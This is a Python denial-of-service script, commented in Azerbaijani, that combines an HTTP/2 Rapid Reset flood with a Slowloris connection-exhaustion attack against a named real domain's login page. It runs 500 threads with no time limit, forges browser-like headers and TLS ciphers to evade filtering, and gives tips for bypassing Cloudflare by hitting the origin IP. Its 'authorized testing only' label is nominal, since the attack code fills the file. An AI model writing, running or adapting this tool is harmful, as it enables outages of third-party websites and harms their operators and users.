#!/usr/bin/env python3
"""
Heavy Layer-7 HTTP/2 Rapid Reset + Slowloris Combo
Authorized Penetration Testing Tool Only
"""

import socket
import ssl
import random
import threading
import time
import sys

try:
    from h2.connection import H2Connection
    from h2.events import StreamEnded, StreamReset
except ImportError:
    print("[!] pip install h2")
    sys.exit(1)

# ------------------ CONFIG ------------------
TARGET_HOST = "https://empro.az/#/login"  # Hədəf domen (SNI)
TARGET_PORT = 443
ORIGIN_IP = None                 # Əgər origin IP-ni bilsəniz buraya yazın, Cloudflare bypass olar
# ORIGIN_IP = "1.2.3.4"          # Misal üçün origin IP

THREADS = 500                    # Bağlantı sayı (Worker)
STREAMS_PER_CONN = 100           # Hər bağlantıda rapid reset sayı
DURATION = 0                     # 0 = limitsiz (Dayandırmaq üçün CTRL+C)

# Slowloris parametrləri
SLOWLORIS_SOCKETS = 1000
SLOWLORIS_TIMEOUT = 10

# -------------------------------------------

def get_target():
    return ORIGIN_IP if ORIGIN_IP else TARGET_HOST

def rapid_reset_worker(wid):
    """HTTP/2 Rapid Reset: Serverin HTTP/2 state machine-ini tükəndirir"""
    context = ssl.create_default_context()
    context.set_alpn_protocols(['h2'])
    # Müasir brauzer TLS cipher suite imitasiyası
    context.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
    
    while True:
        try:
            sock = socket.create_connection((get_target(), TARGET_PORT), timeout=5)
            if not ORIGIN_IP:
                sock = context.wrap_socket(sock, server_hostname=TARGET_HOST)
            else:
                sock = context.wrap_socket(sock)  # Direct IP, SNI still sent for virtual hosting

            conn = H2Connection()
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # SETTINGS frame göndərmə - serverə deyirik ki, çoxlu axın gözləyin
            conn.update_settings({
                'ENABLE_PUSH': 0,
                'MAX_CONCURRENT_STREAMS': 1000,  # Serveri aldatmaq üçün yüksək dəyər
                'WINDOW_SIZE': 0  # Zero window - server cavab göndərə bilməsin, lakin resurs ayırır
            })
            sock.sendall(conn.data_to_send())

            # Hər bağlantıda yüzlərlə axın aç və dərhal ləğv et
            for _ in range(STREAMS_PER_CONN):
                try:
                    stream_id = conn.get_next_available_stream_id()
                    if stream_id is None or stream_id > 2147483646:
                        break
                    
                    # Fake GET sorğusu göndər (HEADERS frame)
                    headers = [
                        (':method', random.choice(['GET', 'POST', 'HEAD'])),
                        (':path', f'/?_={random.randint(100000,999999)}&x={random.randint(100000,999999)}'),
                        (':scheme', 'https'),
                        (':authority', TARGET_HOST),
                        ('user-agent', random.choice([
                            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0',
                            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0'
                        ])),
                        ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                        ('accept-language', 'en-US,en;q=0.5'),
                        ('accept-encoding', 'gzip, deflate, br'),
                        ('referer', 'https://www.google.com/'),
                        ('cache-control', 'no-cache'),
                    ]
                    conn.send_headers(stream_id, headers, end_stream=True)
                    sock.sendall(conn.data_to_send())

                    # DƏRHAL RST_STREAM göndər - bu "Rapid Reset" nöqtəsidir
                    conn.reset_stream(stream_id)
                    sock.sendall(conn.data_to_send())
                    
                except Exception:
                    break

            sock.close()
        except Exception:
            pass

def slowloris_worker(wid):
    """Klassik Slowloris: Bağlantıları açıq saxla, server socket pool-unu doldur"""
    context = ssl.create_default_context()
    
    while True:
        sockets = []
        try:
            # Bir worker minlərlə yavaş bağlantı açır
            for _ in range(SLOWLORIS_SOCKETS // THREADS):
                try:
                    s = socket.create_connection((get_target(), TARGET_PORT), timeout=SLOWLORIS_TIMEOUT)
                    if not ORIGIN_IP:
                        s = context.wrap_socket(s, server_hostname=TARGET_HOST)
                    else:
                        s = context.wrap_socket(s)
                    
                    # HTTP/1.1 Slowloris
                    http_ver = random.choice([b"HTTP/1.1", b"HTTP/1.0"])
                    s.send(f"GET /?r={random.randint(1,999999)} {http_ver}\r\n".encode())
                    s.send(f"Host: {TARGET_HOST}\r\n".encode())
                    s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
                    s.send(b"Accept: text/html,*/*\r\n")
                    # Header-i yarımçıq saxlayırıq - server request-in bitməsini gözləyir
                    # Hər 10-15 saniyədə bir xarakter göndəririk ki, timeout olmasın
                    sockets.append(s)
                except:
                    pass

            # Bağlantıları açıq saxla və ara-sıra boşluq göndər
            for _ in range(30):  # 30 * 5 saniyə = 2.5 dəqiqə
                time.sleep(5)
                for s in sockets[:]:
                    try:
                        s.send(b"X-a: keep\r\n")
                    except:
                        sockets.remove(s)
                        
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
                    
        except Exception:
            pass

def stats_reporter():
    import os
    start = time.time()
    while True:
        time.sleep(5)
        print(f"[*] Uptime: {int(time.time()-start)}s | Workers active. Check target manually for 502/504.")

if __name__ == "__main__":
    if ORIGIN_IP:
        print(f"[!] DIRECT ORIGIN MODE: {ORIGIN_IP} (Cloudflare bypassed)")
    else:
        print(f"[!] PROXY MODE: {TARGET_HOST} via Cloudflare")
        print(f"    TIP: Set ORIGIN_IP variable to bypass Cloudflare entirely.")
    
    print(f"[*] Launching {THREADS} workers...")
    print(f"[*] Mode: HTTP/2 Rapid Reset ({STREAMS_PER_CONN} streams/conn) + Slowloris")
    print("[*] Press CTRL+C to stop.\n")

    # Rapid Reset ordusu
    for i in range(THREADS):
        t = threading.Thread(target=rapid_reset_worker, args=(i,), daemon=True)
        t.start()

    # Slowloris ordusu (əlaqə tükənməsi üçün)
    for i in range(THREADS // 2):
        t = threading.Thread(target=slowloris_worker, args=(i,), daemon=True)
        t.start()

    stats_reporter()
